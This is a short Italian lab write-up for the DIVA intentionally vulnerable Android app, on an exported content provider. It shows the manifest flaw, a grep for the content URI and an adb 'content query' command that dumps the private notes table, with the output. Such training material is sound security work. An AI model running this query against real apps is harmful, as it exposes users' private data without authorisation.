## Access Control Issues - Part 3

Codice Vulnerabile:

> app/src/main/AndroidManifest.xml

```
<provider
    android:name=".NotesProvider"
    android:authorities="jakhar.aseem.diva.provider.notesprovider"
    android:enabled="true"
    android:exported="true" >
</provider>
```

I content provider sono rappresentati usando URI che iniziano con `content://`

Exploit:

- `$ grep -r "content:" *`

`app/src/main/res/values/strings.xml:    <string name="notesprovider_url">content://jakhar.aseem.diva.provider.notesprovider/notes</string>`

- `content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes`

```
Row: 0 _id=5, title=Exercise, note=Alternate days running
Row: 1 _id=4, title=Expense, note=Spent too much on home theater
Row: 2 _id=6, title=Weekend, note=b333333333333r
Row: 3 _id=3, title=holiday, note=Either Goa or Amsterdam
Row: 4 _id=2, title=home, note=Buy toys for baby, Order dinner
Row: 5 _id=1, title=office, note=10 Meetings. 5 Calls. Lunch with CEO
```
